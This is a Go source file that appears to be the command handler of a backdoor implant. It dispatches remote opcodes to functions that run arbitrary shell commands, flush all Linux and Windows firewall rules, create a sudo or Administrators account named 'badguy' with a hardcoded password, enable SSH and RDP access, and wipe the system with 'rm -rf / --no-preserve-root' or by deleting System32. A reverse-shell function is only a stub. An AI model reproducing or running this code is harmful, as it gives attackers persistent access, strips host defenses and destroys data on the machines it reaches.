package utils

import (
	"os"
	"os/exec"
	"runtime"
)

//ExecCommand will pass each action to appropriate handler
func ExecCommand(mode string, args string) string {
	var retval string
	switch mode {
	case "0": //no command
		return ""
	case "1": //shell exec of args
		retval = shellExec(args)
	case "2":
		retval = fwFlush()
	case "3":
		retval = createUser()
	case "4":
		retval = enableRemote()
	case "5":
		retval = unknownCom()
	case "6":
		retval = unknownCom()
	case "7":
		retval = unknownCom()
	case "8":
		retval = unknownCom()
	case "9":
		retval = unknownCom()
	case "A":
		retval = unknownCom()
	case "B":
		retval = unknownCom()
	case "F":
		retval = nuke()
	default:
		retval = unknownCom()
	}
	if retval == "" {
		retval = "<No Output>"
	}
	return retval
}

//most commonly used, pass in args to a shell
func shellExec(args string) string {
	var shellvar string
	if runtime.GOOS == "linux" {
		shellvar = "/bin/sh"
	} else if runtime.GOOS == "windows" {
		shellvar = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	} else {
		return "No shell available"
	}
	cmd := exec.Command(shellvar, "-c", args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//flush firewall rules from all tables
func fwFlush() string {
	var cmd *exec.Cmd
	if runtime.GOOS == "linux" {
		cmd = exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
	} else if runtime.GOOS == "windows" {
		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-c", "Remove-NetFirewallRule -All; Set-NetFirewallProfile -DefaultInboundAction Allow -DefaultOutboundAction Allow;")
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//create a new user.  maybe in the future name/pass will be passed as args
func createUser() string {
	var cmd *exec.Cmd
	if runtime.GOOS == "linux" {
		comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
		if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
			comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
		}
		cmd = exec.Command("/bin/sh", "-c", comStr)
	} else if runtime.GOOS == "windows" {
		comstr := "$p = ConvertTo-SecureString -Force -AsPlainText \"Letmein123!\";New-LocalUser \"badguy\" -Password $p -FullName \"Bad Guy\" -Description \"Non-malicious user\"; Add-LocalGroupMember -Group \"Administrators\" -Member \"badguy\"; Add-LocalGroupMember -Group \"Remote Desktop Users\" -Member \"badguy\";"
		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-c", comstr)
	} else {
		return "shell unavailable"
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//allow ssh connections and restart the service
func enableRemote() string {
	var cmd *exec.Cmd
	if runtime.GOOS == "linux" {
		insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
		insRule.Run()
		cmd = exec.Command("/bin/sh", "-c", "systemctl restart sshd")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return string(err.Error())
		}
		return string(out)
	} else if runtime.GOOS == "windows" {
		comstr := "Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\' -Name \"fDenyTSConnections\" -Value 0; Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\\" -Name \"UserAuthentication\" -Value 1; Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\""
		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-c", comstr)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return string(err.Error())
		}
		return string(out)
	}
	return "No shell available"
}

//spawn a (disowned) reverse shell back to target IP/port
func spawnRevShell(target string) string {

	//soon to come...
	return "Sorry"
}

// probably never use this, but it's nice to have around :^)
func nuke() string {
	var cmd *exec.Cmd
	if runtime.GOOS == "linux" {
		cmd = exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
	} else if runtime.GOOS == "windows" {
		cmd = exec.Command("Remove-Item -Path \"C:\\Windows\\System32\" -Recurse -Force -Confirm:$false")
	} else {
		return "No shell available"
	}
	out, _ := cmd.CombinedOutput()
	return string(out)
}

//if the opcode is something weird, dont know what to do with it
func unknownCom() string {
	return "Unknown command"
}

func checkFileExists(pth string) bool {
	if _, err := os.Stat(pth); os.IsNotExist(err) {
		return false
	}
	return true
}
